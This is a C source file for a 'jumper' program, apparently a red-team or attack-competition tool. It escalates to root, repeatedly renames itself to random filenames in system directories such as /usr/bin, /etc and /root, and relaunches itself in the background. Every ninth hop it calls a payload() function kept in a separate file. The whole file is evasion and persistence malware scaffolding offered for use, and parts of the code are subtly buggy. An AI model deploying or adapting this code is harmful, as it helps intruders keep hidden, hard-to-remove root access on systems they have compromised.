//Michael Burke
//Program that relocates itself every ~100 milliseconds,
//executing a payload everytime it moves

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <sys/time.h>
#include <time.h>
#include <string.h>
#include "payload.c"

// Global parameters
#define SAVECPU 1
#define VERBOSE 0
#define CLOCK 9
#define STOP "/root/KILLHAX"

#define TRUE 1
#define FALSE 0
#define ERROR -1

//Get the trailing number in the filename; used if SAVECPU is enabled
char getnum(char *str){
    char ret = str[strlen(str)-1];
    return ret;
}

//Test to see if the kill file exists
int isKill(){
    if (access(STOP, F_OK) == FALSE ) {
        //File exists
        return TRUE;
    }
    //File does not exist
    return FALSE;
}

//Generate a random string of length n
void rand_str(char *dest, size_t length) {
    struct timeval te;
    gettimeofday(&te, NULL);
    srand((unsigned int)te.tv_usec);
    char charset[] = "0123456789"
                     "abcdefghijklmnopqrstuvwxyz"
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    while (length-- > 0) {
        size_t index = (double) rand() / RAND_MAX * (sizeof charset - 1);
        *dest++ = charset[index];
    }
    *dest = '\0';
}

//Main function
int go(int argc, char *argv[]){
    //Define list of valid paths to put the file in
    char paths[7][50] = {
        "/usr/local/",
        "/usr/bin/",
        "/etc/",
        "/var/lib/",
        "/usr/sbin/",
        "/root/",
        "/home/",
    };
    //Set the owner of jumper to root
    chown(argv[0], 0, 0);
    //Seed the random generator with the current time of day (in milliseconds)
    struct timeval te;
    gettimeofday(&te, NULL);
    srand((unsigned int)te.tv_usec);
    struct timespec ts;
    //Sleep for a random amount of time between 50-150ms
    ts.tv_sec = 0;
    ts.tv_nsec = (rand()%100+50) * 1000000;
    nanosleep(&ts, &ts);
    //Test to see if the kill file exists
    if (isKill() == TRUE){
        printf("Received emergency kill signal!\n");
        remove(argv[0]);
        return 1;
    }
    //Generate a random filename 5 characters long
    int string_len = 5;
    //Make the last character non-zero so we can test based on it later
    char str[] = { [5] = '\1' };
    rand_str(str, sizeof str - 1);
    //Test the correct insertion of string terminator    int i = -1;
    assert(str[5] == '\0');
    //Pick a random path from the list of paths
    char *path = paths[rand()%6];
    strcat(path, str);
    //SAVECPU mode executes the payload every 9th jump
    if (SAVECPU) {
        int curNum;
        //Get/set the current counter number
        if (strcmp(argv[0], "./jumper") == 0){
            curNum = 0;
        } else {
            char curNumStr = getnum(argv[0]);
            curNum = atoi(&curNumStr);
        }
        //If this is the 9th jump, execute the payload and reset the counter
        if (curNum == CLOCK){
            curNum = 0;
            payload();
        } else {
            curNum += 1;
        }
        //Append the new jump number to the filename
        char tmpstr[1];
        sprintf(tmpstr, "%d", curNum);
        strcat(path, tmpstr);
    } else {
        payload();
    }
    if (VERBOSE){
        printf("Jumper is now at %s\n", path);
    }
    //Move jumper to the new location
    rename(argv[0], path);
    //Make sure the copy worked
    if( access( path, F_OK ) != 0 ) {
        return go(argc, argv);
    }
    //Execute the copied binary and return
    strcat(path, " &");
    system(path);
    return TRUE;
}

int main(int argc, char *argv[]){
    //Set the uid to root and run the main function
    setuid(0);
    return go(argc, argv);
}